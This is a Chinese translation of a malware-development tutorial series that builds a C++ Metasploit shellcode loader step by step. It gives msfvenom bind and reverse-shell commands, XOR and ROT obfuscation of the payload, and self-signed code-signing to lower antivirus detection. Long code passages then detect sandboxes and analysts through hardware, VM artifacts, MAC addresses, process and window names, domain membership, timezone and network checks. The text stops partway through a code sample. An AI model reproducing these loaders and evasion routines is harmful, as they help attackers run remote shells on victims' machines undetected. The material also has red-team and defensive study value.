# 恶意软件开发 Part 1

阅读量 **401326**

|评论 **4**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2020-05-15 10:30:12

 **x**

##### 译文声明

本文是翻译文章，文章原作者 0xPat，文章来源：0xpat.github.io

原文地址：<https://0xpat.github.io/Malware_development_part_1/>

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p5.ssl.qhimg.com/t0133a24fb9aa83471f.png)

## 简介

本文是恶意软件开发系列文章的第一篇。在本系列文章中，我们将探索并尝试实现多个恶意软件中使用的技术，恶意软件使用这些技术实现代码执行，绕过防御，以及持久化。

我们将创建一个C++程序，该程序会运行恶意的shellcode，同时试图绕过防病毒软件的检测。

为什么我们在这里选择C++而不是C#或者PowerShell脚本呢？因为和托管代码(managed
code)以及脚本相比，分析编译好的二进制文件要困难得多。

在本文以及后续的一系列文章中，开发环境都是Windows 10 version 1909，Microsoft Visual Studio 2017。

## 如何对恶意软件进行检测

反恶意软件解决方案可以使用三种类型的检测机制：

  * 基于签名的检测：静态检查文件校验和(MD5, SHA1等)，检查二进制文件中是否存在一直的字符串或字节序列；
  * 启发式检测：一般会对软件的行为进行静态分析，识别潜在的恶意特征(比如使用了与恶意软件有关的特定函数)；
  * 沙箱：对软件进行动态分析，在一个受控环境(沙箱)中执行该软件，并对其行为进行监控。

有多种技术可以用来绕过不同的检测机制。比如：

  * 多态(或者至少经常重编译)的恶意软件可以绕过基于签名的检测机制；
  * 对代码流进行混淆可以绕过启发式检测机制；
  * 基于环境检查的条件语句可以发现并绕过沙箱；
  * 对敏感信息进行编码或者机密可以协助绕过基于签名的检测以及启发式检测机制。

## 现在开始工作！

###  新建一个项目

首先创建一个新的项目——Windows C++ Console Application (x86)。

![](https://p4.ssl.qhimg.com/t01a0336910e93f1552.png)

###  生成shellcode

我们使用Metasploit生成一些恶意的shellcode，这里选择TCP bind shell。

    
    
    msfvenom -p windows/shell_bind_tcp LPORT=4444 -f c
    

从名字就可以看出，shellcode是一段用于运行本地或者远程系统shell的代码。主要是在攻击软件漏洞的过程中使用shellcode：在攻击者可以控制程序的执行流程后，他需要用一些通用的payload执行所需操作(一般是访问shell)，不管是本地攻击(例如权限提升)还是远程攻击(例如在服务器上实现RCE)都是如此。

Shellcode其实是一个引导程序，利用已知的某种特定平台的机制来执行特定操作(创建进程，建立TCP连接等)。Windows上的shellcode通常使用线程环境块(TEB,
Thread Environment Block)和金承焕晶块(PEB, Process Environment
Block)查找已加载系统库(`kernel32.dll`, `kernelbase.dll`或者`ntdll.dll`)
的地址，然后在系统库中寻找`LoadLibrary`和`GetProcAddress`函数的地址，使用这些函数可以进一步定位其他函数。

生成的shellcode可以作为字符串包含在二进制文件中。执行这个char数组的一个经典方法就是把这个数组转换为指向函数的指针，即：

    
    
    void (*func)();
    func = (void (*)()) code;
    func();
    

或者直接使用这个经典的一行代码，我刚开始学习的时候从来没把它写对过：

    
    
    (*(void(*)()) code)();
    

但是我发现，因为存在数据执行保护机制，我无法在栈上执行数据(栈上的数据受到保护无法执行)。尽管使用GCC(`-fno-stack-protector`和`-z execstack`标志)可以很简单地让数据执行，但是我没试过用Visual
Studio和MSVC编译器实现这一点，因为这和本文的目标没有什么太大关系。

注意：在应用程序里执行shellcode看起来似乎毫无意义，因为我们也可以用C/C++实现其功能。但是有些时候还是需要实现自定义的shellcode加载器或注入器(比如说运行其他工具生成的shellcode)。除了用来执行已知的恶意代码(像是Metasploit生成的shellcode)之外，它还可以用做测试检测机制和绕过机制时的PoC。

###  执行shellcode

实际执行shellcode有一些困难，我们需要：

  * 使用Windows API函数[`VirtualAlloc`](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc)(远程进程需要使用[`VirtualAllocEx`](https://docs.microsoft.com/pl-pl/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex))分配一块新的内存区域；
  * 用shellcode字节填充这块区域。可以使用[`RtlCopyMemory`](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlcopymemory)函数，该函数基本上就是封装的`memcpy`；
  * 使用[`CreateThread`](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread)或者[`CreateRemoteThread`](https://docs.microsoft.com/pl-pl/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread)函数创建一个新的本地或远程线程。

如果shellcode所在的内存区域被标记为可执行的，也可以使用把char数组转换为函数指针的方式执行shellcode。

这样的一个程序的源代码如下所示：

    
    
    #include <Windows.h>
    
    void main()
    {
        const char shellcode[] = "xfcxe8x82 (...) ";
        PVOID shellcode_exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        RtlCopyMemory(shellcode_exec, shellcode, sizeof shellcode);
        DWORD threadID;
        HANDLE hThread = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)shellcode_exec, NULL, 0, &threadID);
        WaitForSingleObject(hThread, INFINITE);
    }
    

## 使用VirusTotal进行测试

在正式发布这个恶意软件之前，我们需要确保已经从二进制文件中删除了一部分内容。比如说需要删掉所有调试符号和其他相关信息，可以把项目的创建配置改成“Release”，同时禁止生成调试信息(该选项在项目属性的链接器配置里)。

除此之外，在使用Visual Stdio的时候，默认会把程序数据库(PDB, Program
Database)的路径嵌入二进制文件中。PDF可以用来存储调试信息，该文件与可执行文件(或DLL)位于同一目录。因此该路径信息可能会泄露一些敏感信息，比如说“`C:usersnameSurnameDesktopcompanyNameclientNameassessmentDateMaliciousAppReleaseapp.exe`”。

首先看一下VirusTotal对这个shellcode的扫描结果：

![](https://p5.ssl.qhimg.com/t01179d2f31f5800517.png)

下面是启动后马上执行shellcode的二进制文件的扫描结果：

![](https://p3.ssl.qhimg.com/t0176a6e7143d346c65.png)

对我们的可执行程序来说，检测率有些低。

## Shellcode混淆

首先想到的就是修改shellcode内容，从而绕过基于签名的静态分析。

我们可以试一下最简单的“加密”方法——对shellcode中所有的字节应用ROT13加密，这样0x41会变成0x54，0xFF会变成0x0C，依此类推。在执行的过程中，会对shellcode进行“解密”，即从每个字节中减去0x0D。

代码如下所示：

    
    
    #include <Windows.h>
    
    void main()
    {
        const char shellcode[] = "x09xf5x8f (...) ";
        PVOID shellcode_exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        RtlCopyMemory(shellcode_exec, shellcode, sizeof shellcode);
        DWORD threadID;
        for (int i = 0; i < sizeof shellcode; i++)
        {
            ((char*)shellcode_exec)[i] = (((char*)shellcode_exec)[i]) - 13;
        }
        HANDLE hThread = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)shellcode_exec, NULL, 0, &threadID);
        WaitForSingleObject(hThread, INFINITE);
    }
    

也可以使用XOR加密(使用不变的单字节密钥)代替凯撒加密：

    
    
    for (int i = 0; i < sizeof shellcode; i++)
    {
        ((char*)shellcode_exec)[i] = (((char*)shellcode_exec)[i]) ^ 'x35';
    }
    

但是这种方法没什么用处：

![](https://p4.ssl.qhimg.com/t01e12a6fca31bd8eae.png)

## 让程序变得更合法

###  对“空”程序进行分析

通过对VirusTotal上面恶意软件检测系统的行为进行分析，我们注意到即使一个程序基本上什么都不做，有几个反病毒引擎也会把它标记未恶意软件。

编译下面的代码：

    
    
    void main()
    {
        return;
    }
    

测试生成的二进制文件：

![](https://p5.ssl.qhimg.com/t01d08e9f2e1ea582b1.png)

这就说明，我们可能需要采用一些和恶意shellcode本身没有什么关系的技术。

###  对二进制文件进行签名

一些恶意软件检测引擎可能会把未签名的二进制文件标记为可疑的。接下来要建立一个代码签名机制，我们需要证书颁发机构以及代码签名证书：

    
    
    makecert -r -pe -n "CN=Malwr CA" -ss CA -sr CurrentUser -a sha256 -cy authority -sky signature -sv MalwrCA.pvk MalwrCA.cer
    certutil -user -addstore Root MalwrCA.cer
    makecert -pe -n "CN=Malwr Cert" -a sha256 -cy end -sky signature -ic MalwrCA.cer -iv MalwrCA.pvk -sv MalwrCert.pvk MalwrCert.cer
    pvk2pfx -pvk MalwrCert.pvk -spc MalwrCert.cer -pfx MalwrCert.pfx
    signtool sign /v /f MalwrCert.pfx /t http://timestamp.verisign.com/scripts/timstamp.dll Malware.exe
    

通过执行上面的命令，我们生成了证书颁发机构“Malwr”，将其导入到证书存储区，创建一个格式为`.pfx`的代码签名证书，使用该征输对二进制文件进行签名。

注意：可以在Visual Studio的项目属性中把二进制文件签名配置为Post-Build Event：

    
    
    signtool.exe sign /v /f $(SolutionDir)CertMalwrSPC.pfx /t http://timestamp.verisign.com/scripts/timstamp.dll $(TargetPath)
    

该已签名程序的检测率小了不少：

![](https://p0.ssl.qhimg.com/t01d3cd26f409705dbf.png)

###  链接库的问题

在探索Visual C++
项目的编译和链接属性时，我发现，如果把链接器选项中的其他依赖项删除掉(尤其是`kernel32.lib`)，某些反恶意软件引擎就不会把生成的可执行文件标记为恶意的。有趣的是，`kernel32.lib`在代码编译后还是会被静态链接到程序上，因为二进制文件需要(从kernel32.dll那里)知道到哪里定位关键的API函数。

使用这个 **奇怪的技巧** 降低恶意软件的检测率：

![](https://p2.ssl.qhimg.com/t010cca689038144a91.png)

## 切换到64位

我想现在大多数计算机(尤其是用户工作站)运行的都是64位系统。所以接下来生成64位bind shell payload，并使用VirusTotal进行测试：

    
    
    msfvenom -p windows/x64/shell_bind_tcp LPORT=4444 -f raw
    

检测率明显低于32位的版本(23/51)：

![](https://p2.ssl.qhimg.com/t01911de8cd3b89dd16.png)

对使用同样的技术编写的代码进行编译，测试生成的程序，检测率非常低：

![](https://p1.ssl.qhimg.com/t01401909c0b42090b0.png)

## 总结

在本文中我们制作了一个简易的shellcode加载器，同时利用一些不太复杂的技术显著降低了它的检测率。但是这个程序还是可以被Microsoft
Defender检测到！

## 续

在接下来的内容中，我们将探索并尝试实现多个恶意软件中使用的技术，恶意软件使用这些技术实现代码执行，绕过防御，以及持久化。

之前，我们用C++创建了一个基本的Metasploit
shellcode启动器，并探索了有助于降低编译后可执行文件检测率的基本技术，包括payload编码/加密，使用自定义代码签名证书对二进制文件签名，以及转换为64位程序。

接下来，我们会深入研究恶意软件的动态分析及其绕过方法。

注意：假定的执行环境为64位，所以部分代码示例可能无法在32位环境下工作（比如说代码里面有硬编码的8字节指针或者PE和PEB的内部布局不同）。除此之外，下面的代码示例中省略了错误检查。

## 恶意软件的动态分析

可执行文件的动态分析可以由沙箱自动执行，也可以由分析人员手动执行。恶意软件会使用各种方法来对其执行环境进行指纹识别，并根据识别结果执行不同的操作。

自动化分析是在一个简化的沙箱环境中进行，该环境可能有一些特定的特征，尤其是它可能无法模拟真实环境的所有细节。
手动分析通常在一个虚拟环境中进行，可能会使用一些其他的特定工具（例如调试器和其他分析软件）。

自动分析和手动分析有一些相同的特征，最主要的就是它们通常是在一个虚拟化的环境中进行，如果环境配置（加固）不正确，就会很容易被检测到。
大多数沙箱/分析检测技术会检查是否存在特定的环境属性或文件，比如说会检查环境资源是否有限，是否存在有暗示性的设备名称、特定的文件或注册表项。

但是，针对自动化分析的沙箱环境有几种特定的检测方法，而对于恶意软件分析人员所使用的虚拟环境也有其他特定的检测方法。

###  对恶意软件检测的小测试

我们会使用上一篇文章中的代码进行测试，该代码将经过XOR解密的shellcode注入新分配的内存块中，并进行执行：

    
    
    void main()
    {
        const char shellcode[] = "xc9x7dxb6 (...) ";
        PVOID shellcode_exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        RtlCopyMemory(shellcode_exec, shellcode, sizeof shellcode);
        DWORD threadID;
        for (int i = 0; i < sizeof shellcode; i++)
        {
            ((char*)shellcode_exec)[i] = (((char*)shellcode_exec)[i]) ^ 'x35';
        }
        HANDLE hThread = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)shellcode_exec, NULL, 0, &threadID);
        WaitForSingleObject(hThread, INFINITE);
    }
    

为了绕过某些静态检测方法，该代码生成的是64位程序，并使用自定义证书进行了签名。

不过这一次我们使用的是反向shell的shellcode：

    
    
    msfvenom -p windows/x64/shell_reverse_tcp LPORT=4444 LHOST=192.168.200.102 -f raw
    

我们会查看在动态分析的过程中是否提取了反向shell的IP地址（这里就是一个基本的威胁指示(IoC)情报）。

使用上一篇文章中提到的反病毒绕过技术，程序在VirusTotal上的检测率已经很低了：

![](https://p3.ssl.qhimg.com/t0140bd4b55e06bdec5.png)

Microsoft Defender检测的结果是“ Meterpreter
trojan”（事实上只是一个TCP的反向Shell，而不是Meterpreter木马）。 VirusTotal上的沙箱可以在动态分析期间提取IP地址。

接下来先讲一些在动态分析的检测和绕过中使用的通用技术。

## 虚拟化环境检测

沙箱和分析人员使用的虚拟化操作系统通常都不能100％准确地模拟真实的执行环境（比如一般的用户工作站）。虚拟化环境的资源有限（相应的设备名称也能提供有用的信息），可能安装了针对虚拟机的工具和驱动程序，通常看起来像是一个新安装的Windows系统，有时还会使用固定的用户名或计算机名。我们可以在检测中利用以上几点。

###  硬件资源

资源有限是最主要的问题，沙箱可能无法同时进行多个耗时而且占用大量资源的模拟，因此通常会限制分配给单个实例的资源和时间。
分析人员一般使用的虚拟机也有相同的限制——只有有限的资源。

一般的用户工作站使用的处理器至少有2个内核，内存至少有2 GB，硬盘至少有100 GB。 我们可以验证恶意软件的执行环境是否受到了这些约束的限制：

    
    
    // check CPU
    SYSTEM_INFO systemInfo;
    GetSystemInfo(&systemInfo);
    DWORD numberOfProcessors = systemInfo.dwNumberOfProcessors;
    if (numberOfProcessors < 2) return false;
    
    // check RAM
    MEMORYSTATUSEX memoryStatus;
    memoryStatus.dwLength = sizeof(memoryStatus);
    GlobalMemoryStatusEx(&memoryStatus);
    DWORD RAMMB = memoryStatus.ullTotalPhys / 1024 / 1024;
    if (RAMMB < 2048) return false;
    
    // check HDD
    HANDLE hDevice = CreateFileW(L"\\.\PhysicalDrive0", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    DISK_GEOMETRY pDiskGeometry;
    DWORD bytesReturned;
    DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0, &pDiskGeometry, sizeof(pDiskGeometry), &bytesReturned, (LPOVERLAPPED)NULL);
    DWORD diskSizeGB;
    diskSizeGB = pDiskGeometry.Cylinders.QuadPart * (ULONG)pDiskGeometry.TracksPerCylinder * (ULONG)pDiskGeometry.SectorsPerTrack * (ULONG)pDiskGeometry.BytesPerSector / 1024 / 1024 / 1024;
    if (diskSizeGB < 100) return false;
    

进行这些简单的检查后，我们可以把检测率降到零：

![](https://p1.ssl.qhimg.com/t0115485ea6ccbd5cbf.png)

VirusTotal沙箱执行的动态分析没有提供任何IP（IoC）。

###  设备和供应商名称

使用默认选项安装的虚拟机中，设备名称一般是可以预测的，比如说会包含与特定虚拟机管理程序有关的字符串。
我们可以检查硬盘驱动器名称，光驱名称，BIOS版本，计算机制造商及型号，图形控制器名称等内容。使用WMI
Query检索相关信息（检查类似“Name”、“Description”、“Caption”这样的属性）。

下面是一个使用Windows API函数（没有使用WMI）检索HDD名称的示例：

    
    
    HDEVINFO hDeviceInfo = SetupDiGetClassDevs(&GUID_DEVCLASS_DISKDRIVE, 0, 0, DIGCF_PRESENT);
    SP_DEVINFO_DATA deviceInfoData;
    deviceInfoData.cbSize = sizeof(SP_DEVINFO_DATA);
    SetupDiEnumDeviceInfo(hDeviceInfo, 0, &deviceInfoData);
    DWORD propertyBufferSize;
    SetupDiGetDeviceRegistryPropertyW(hDeviceInfo, &deviceInfoData, SPDRP_FRIENDLYNAME, NULL, NULL, 0, &propertyBufferSize);
    PWSTR HDDName = (PWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, propertyBufferSize);
    SetupDiGetDeviceRegistryPropertyW(hDeviceInfo, &deviceInfoData, SPDRP_FRIENDLYNAME, NULL, (PBYTE)HDDName, propertyBufferSize, NULL);
    CharUpperW(HDDName);
    if (wcsstr(HDDName, L"VBOX")) return false;
    

还可以查找一般主机系统中不存在的特定虚拟设备，比如管道以及其他访客和主机间的通信接口：

    
    
    OBJECT_ATTRIBUTES objectAttributes;
    UNICODE_STRING uDeviceName;
    RtlSecureZeroMemory(&uDeviceName, sizeof(uDeviceName));
    RtlInitUnicodeString(&uDeviceName, L"\Device\VBoxGuest"); // or pipe: L"\??\pipe\VBoxTrayIPC-<username>"
    InitializeObjectAttributes(&objectAttributes, &uDeviceName, OBJ_CASE_INSENSITIVE, 0, NULL);
    HANDLE hDevice = NULL;
    IO_STATUS_BLOCK ioStatusBlock;
    NTSTATUS status = NtCreateFile(&hDevice, GENERIC_READ, &objectAttributes, &ioStatusBlock, NULL, 0, 0, FILE_OPEN, 0, NULL, 0);
    if (NT_SUCCESS(status)) return false;
    

还应该注意网络设备，尤其是MAC地址。MAC地址可能会暗示虚拟环境的存在，因为默认情况下它的前3个字节是制造商标识符。
可以遍历所有可用的网络适配器，用前几个字节与已知值进行比较：

    
    
    DWORD adaptersListSize = 0;
    GetAdaptersAddresses(AF_UNSPEC, 0, 0, 0, &adaptersListSize);
    IP_ADAPTER_ADDRESSES* pAdaptersAddresses = (IP_ADAPTER_ADDRESSES*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, adaptersListSize);
    if (pAdaptersAddresses)
    {
        GetAdaptersAddresses(AF_UNSPEC, 0, 0, pAdaptersAddresses, &adaptersListSize);
        char mac[6] = { 0 };
        while (pAdaptersAddresses)
        {
            if (pAdaptersAddresses->PhysicalAddressLength == 6)
            {
                memcpy(mac, pAdaptersAddresses->PhysicalAddress, 6);
                if (!memcmp({ "x08x00x27" }, mac, 3)) return false;
            }
        pAdaptersAddresses = pAdaptersAddresses->Next;
        }
    }
    

###  虚拟机特有的组件

虚拟化环境中还会有一些特有的组件，比如说有些文件或者注册表项会说明存在虚拟机管理程序。
我们可以检查与管理程序提供的驱动程序，设备和模块有关的文件和目录，也可以检查包含配置信息或硬件描述的注册表项。

可以在以下目录检查上面提到的组件：`C:WindowsSystem32`和
`C:WindowsSystem32Drivers`。可疑的注册表项是`HKLMSYSTEMControlSet001Services`，`HKLMHARDWAREDescriptionSystem`，`HKLMSYSTEMCurrentControlSetControlSystemInformation`等等。

下面的代码可以用于探测VirtualBox特有的文件和注册表项：

    
    
    // check files
    WIN32_FIND_DATAW findFileData;
    if (FindFirstFileW(L"C:\Windows\System32\VBox*.dll", &findFileData) != INVALID_HANDLE_VALUE) return false;
    
    // check registry key
    HKEY hkResult;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SYSTEM\ControlSet001\Services\VBoxSF", 0, KEY_QUERY_VALUE, &hkResult) == ERROR_SUCCESS) return false;
    

###  文件、目录、进程以及窗口名称

下面的方法可用于检测沙箱，虚拟机，调试器或手动分析的环境，因为有一些应用程序普通用户是不会使用的（以及相关的进程、窗口名称以及加载的库）。

####  应用程序名称和目录

沙箱有时会把自己分析的二进制文件名称改为一个通用名称，例如`sample.exe`。 恶意软件分析人员也可能在运行程序前重命名该文件。
我们可以检查文件或目录名称中是否包含“可疑”字符串。
但是，如果我们可以确定可执行文件的名称和路径时（比如VBA宏泄露了该内容），我们就可以验证它是否真的是从假设的位置执行的：

    
    
    wchar_t currentProcessPath[MAX_PATH + 1];
    GetModuleFileNameW(NULL, currentProcessPath, MAX_PATH + 1);
    CharUpperW(currentProcessPath);
    if (!wcsstr(currentProcessPath, L"C:\USERS\PUBLIC\")) return false;
    if (!wcsstr(currentProcessPath, L"MALWARE.EXE")) return false;
    

####  父进程

有时恶意程序本来应该由特定进程启动，例如`explorere.exe`或`svchost.exe`。或者它本来不应该由类似调试器这样的进程启动。
我们可以根据父进程名称设置条件：

    
    
    DWORD GetParentPID(DWORD pid)
    {
        DWORD ppid = 0;
        PROCESSENTRY32W processEntry = { 0 };
        processEntry.dwSize = sizeof(PROCESSENTRY32W);
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (Process32FirstW(hSnapshot, &processEntry))
        {
            do
            {
                if (processEntry.th32ProcessID == pid)
                {
                    ppid = processEntry.th32ParentProcessID;
                    break;
                }
            } while (Process32NextW(hSnapshot, &processEntry));
        }
        CloseHandle(hSnapshot);
        return ppid;
    }
    
    void main()
    {
        DWORD parentPid = GetParentPID(GetCurrentProcessId());
        WCHAR parentName[MAX_PATH + 1];
        DWORD dwParentName = MAX_PATH;
        HANDLE hParent = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, parentPid);
        QueryFullProcessImageNameW(hParent, 0, parentName, &dwParentName); // another way to get process name is to use 'Toolhelp32Snapshot'
        CharUpperW(parentName);
        if (wcsstr(parentName, L"WINDBG.EXE")) return;
    
        wprintf_s(L"Now hacking...n");
    }
    

####  正在运行的进程

我们可以遍历所有正在运行的进程，检查是否有常见的分析工具，例如Wireshark，Procmon，x64dbg，IDA等。

    
    
    PROCESSENTRY32W processEntry = { 0 };
    processEntry.dwSize = sizeof(PROCESSENTRY32W);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    WCHAR processName[MAX_PATH + 1];
    if (Process32FirstW(hSnapshot, &processEntry))
    {
        do
        {
            StringCchCopyW(processName, MAX_PATH, processEntry.szExeFile);
            CharUpperW(processName);
            if (wcsstr(processName, L"WIRESHARK.EXE")) exit(0);
        } while (Process32NextW(hSnapshot, &processEntry));
    }
    
    wprintf_s(L"Now hacking...n");
    

####  已加载的库

和进程一样，我们可以枚举每个进程地址空间中已加载的模块，检查是否有不应该存在的名称：

    
    
    DWORD runningProcessesIDs[1024];
    DWORD runningProcessesBytes;
    EnumProcesses(runningProcessesIDs, sizeof(runningProcessesIDs), &runningProcessesBytes);
    for (int i = 0; i < runningProcessesBytes / sizeof(DWORD); i++)
    {
        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, runningProcessesIDs[i]);
        if (!hProcess) continue;
        HMODULE processModules[1024];
        DWORD processModulesBytes;
        int s1 = EnumProcessModules(hProcess, processModules, sizeof(processModules), &processModulesBytes);
        for (int j = 0; j < processModulesBytes / sizeof(HMODULE); j++)
        {
            WCHAR moduleName[MAX_PATH + 1];
            GetModuleFileNameExW(hProcess, processModules[j], moduleName, MAX_PATH);
            CharUpperW(moduleName);
            if (wcsstr(moduleName, L"DBGHELP.DLL")) exit(0);
        }
    }
    
    wprintf_s(L"Now hacking...n");
    

####  窗口名称

还可以检查窗口名称，看它是否表示环境中存在常见的恶意软件分析工具：

    
    
    BOOL CALLBACK EnumWindowsProc(HWND hWindow, LPARAM parameter)
    {
        WCHAR windowTitle[1024];
        GetWindowTextW(hWindow, windowTitle, sizeof(windowTitle));
        CharUpperW(windowTitle);
        if (wcsstr(windowTitle, L"SYSINTERNALS")) *(PBOOL)parameter = true;
        return true;
    }
    
    void main()
    {
        bool debugged = false;
        EnumWindows(EnumWindowsProc, (LPARAM)(&debugged));
        if (debugged) return;
    
        wprintf_s(L"Now hacking...n");
    }
    

###  用户名、计算机名以及域名

沙箱和分析人员使用的计算机名和用户名通常不会在一般的工作站上遇到，比如说`Admin`，`Administrator`，`ADMIN-PC`等。此外，默认计算机名所遵循的模式`DESKTOP- [0-9A-Z] {7}`（或其他类似的带有随机字符的模式）在公司环境中很少出现。
我们可以将这些名称与已知的字符串进行比较：

    
    
    //check computer name
    DWORD computerNameLength;
    wchar_t computerName[MAX_COMPUTERNAME_LENGTH + 1];
    GetComputerNameW(computerName, &computerNameLength);
    CharUpperW(computerName);
    if (wcsstr(computerName, L"DESKTOP-")) return false;
    
    //check user name
    DWORD userNameLength;
    wchar_t userName[UNLEN + 1];
    GetUserNameW(userName, &userNameLength);
    CharUpperW(userName);
    if (wcsstr(userName, L"ADMIN")) return false;
    

因为我们的目标通常位于公司环境，所以我们可以假设正常情况下，用户的计算机属于某个域。可以检查计算机是否加入了某个域：

    
    
    PWSTR domainName;
    NETSETUP_JOIN_STATUS status;
    NetGetJoinInformation(NULL, &domainName, &status);
    if (status != NetSetupDomainName) return false;
    

###  屏幕分辨率

虚拟化环境很少使用多个显示器（尤其是沙箱）。虚拟显示器可能也没有特定的屏幕尺寸（尤其是处于自适应主机而不是全屏模式的时候，这时虚拟机窗口有滚动条或者选项卡）。

下面的代码示例有一点复杂。
首先检查了主显示器的分辨率是否过低，如果检查通过，就遍历所有显示器。`EnumDisplayMonitors`函数需要一个用户定义的回调函数，遍历的每个显示器都会调用该函数，函数的参数为显示器的句柄。
回调函数会检查每个显示器的分辨率是否是标准分辨率，返回结果给一个变量。如果存在显示器的宽度或高度不正常，程序就会认为它是在虚拟环境中运行的。

    
    
    bool CALLBACK MyCallback(HMONITOR hMonitor, HDC hdcMonitor, LPRECT lpRect, LPARAM data)
    {
        MONITORINFO monitorInfo;
        monitorInfo.cbSize = sizeof(MONITORINFO);
        GetMonitorInfoW(hMonitor, &monitorInfo);
        int xResolution = monitorInfo.rcMonitor.right - monitorInfo.rcMonitor.left;
        int yResolution = monitorInfo.rcMonitor.top - monitorInfo.rcMonitor.bottom;
        if (xResolution < 0) xResolution = -xResolution;
        if (yResolution < 0) yResolution = -yResolution;
        if ((xResolution != 1920 && xResolution != 2560 && xResolution != 1440)
            || (yResolution != 1080 && yResolution != 1200 && yResolution != 1600 && yResolution != 900))
        {
            *((BOOL*)data) = true;
        }
        return true;
    }
    
    void main()
    {
        MONITORENUMPROC pMyCallback = (MONITORENUMPROC)MyCallback;
        int xResolution = GetSystemMetrics(SM_CXSCREEN);
        int yResolution = GetSystemMetrics(SM_CYSCREEN);
        if (xResolution < 1000 && yResolution < 1000)  return false;
    
        int numberOfMonitors = GetSystemMetrics(SM_CMONITORS);
        bool sandbox = false;
        EnumDisplayMonitors(NULL, NULL, pMyCallback, (LPARAM)(&sandbox));
        if (sandbox) return;
    
        wprintf_s(L"Now hacking...n");
    }
    

使用该方法可以降低一点检测率（文件被标记为“unsafe”而不是“ Meterpreter”），而且也让检测引擎无法完全分析该可执行文件（IP
IoC没有被提取出来）：

![](https://p3.ssl.qhimg.com/t016a6e80f376209c96.png)

###  不再纯净的系统

大多数虚拟环境看起来像是一个新安装的Windows系统。和一般的工作站相比，它们可能缺少某些使用过程中会出现的组件。比如说，注册表中会存储系统中已安装的USB数量。我们可以检查系统是否曾经安装过USB设备：

    
    
    HKEY hKey;
    DWORD mountedUSBDevicesCount;
    RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SYSTEM\ControlSet001\Enum\USBSTOR", 0, KEY_READ, &hKey);
    RegQueryInfoKey(hKey, NULL, NULL, NULL, &mountedUSBDevicesCount, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
    if (mountedUSBDevicesCount < 1) return false;
    

使用这个方法可以进一步降低检测率（Cylance把文件标记成了“unsafe”），并阻止对网络IoC的分析。

![](https://p3.ssl.qhimg.com/t01b4e8f80e3548db3f.png)

###  时区

如果是针对某个特定的用户或组织进行攻击，当所处环境的时区与目标不同时，也可以阻止程序的运行。还要确保系统时区名称不依赖于系统语言。

    
    
    SetThreadLocale(MAKELCID(MAKELANGID(LANG_ENGLISH, SUBLANG_ENGLISH_US), SORT_DEFAULT));
    DYNAMIC_TIME_ZONE_INFORMATION dynamicTimeZoneInfo;
    GetDynamicTimeZoneInformation(&dynamicTimeZoneInfo);
    wchar_t timeZoneName[128 + 1];
    StringCchCopyW(timeZoneName, 128, dynamicTimeZoneInfo.TimeZoneKeyName);
    CharUpperW(timeZoneName);
    if (!wcsstr(timeZoneName, L"CENTRAL EUROPEAN STANDARD TIME")) return false;
    

该方法也可以降级检测率，阻止IoC分析：

![](https://p3.ssl.qhimg.com/t018d3509ca99675d9a.png)

## 自动化分析检测

有一些方法专门用于绕过自动化沙箱分析，这些方法的原理在于沙箱环境中可用的资源有限。通常来说，这样的执行环境缺少真实的网络连接，也无法进行用户交互。

###  网络连接

沙箱一般不支持网络连接，但它们可以模拟来自远程服务器的有效响应。 下面的代码让shellcode根据HTTP请求的结果决定是否运行：

    
    
    HINTERNET hSession = WinHttpOpen(L"Mozilla 5.0", WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    HINTERNET hConnection = WinHttpConnect(hSession, L"my.domain.or.ip", INTERNET_DEFAULT_HTTP_PORT, 0);
    HINTERNET hRequest = WinHttpOpenRequest(hConnection, L"GET", L"test", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, NULL);
    WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
    BOOL status = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
    if (!status) return false;
    

对我们来说，分析结果比没有检查HTTP连接的时候要好，而且VirusTotal的沙箱也没有提取到IP IoC。

![](https://p2.ssl.qhimg.com/t01d3a79c8ebe93cd8f.png)

目标服务器上其实收到了一个HTTP请求，这就说明有的检测引擎在“真实世界”中对程序做了分析。

我们可以进一步完善这种方法，只在收到特定响应时才执行shellcode：

    
    
    HINTERNET hSession = WinHttpOpen(L"Mozilla 5.0", WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    HINTERNET hConnection = WinHttpConnect(hSession, L"my.domain.or.ip", INTERNET_DEFAULT_HTTP_PORT, 0);
